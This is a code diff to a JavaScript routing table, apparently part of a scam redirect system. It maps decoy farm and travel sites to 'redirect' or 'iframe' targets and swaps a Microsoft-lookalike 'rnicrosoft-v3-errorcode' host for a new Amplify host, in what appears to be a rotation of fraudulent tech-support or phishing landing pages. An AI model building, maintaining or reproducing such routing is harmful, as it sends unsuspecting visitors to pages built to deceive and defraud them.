@@ -85,9 +85,9 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairyfarm.netlify.app": { method: "redirect", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
-    "https://takahirofarmfood.com": { method: "redirect", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
-    "https://hiroakitravels.com": { method: "redirect", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
+    "https://naotoshidairyfarm.netlify.app": { method: "redirect", target: "https://main.d3db1iaza9pqmd.amplifyapp.com" },
+    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.d3db1iaza9pqmd.amplifyapp.com" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://main.d3db1iaza9pqmd.amplifyapp.com" },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
@@ -95,7 +95,7 @@ const ORIGIN_GROUPS = {
     "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://ziyan-os3.vercel.app" },
   },
   aomine: {
-    "https://classy-daffodil-ad4c44.netlify.app": { method: "redirect", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
+    "https://classy-daffodil-ad4c44.netlify.app": { method: "redirect", target: "https://main.d3db1iaza9pqmd.amplifyapp.com" },
   },
 };
 
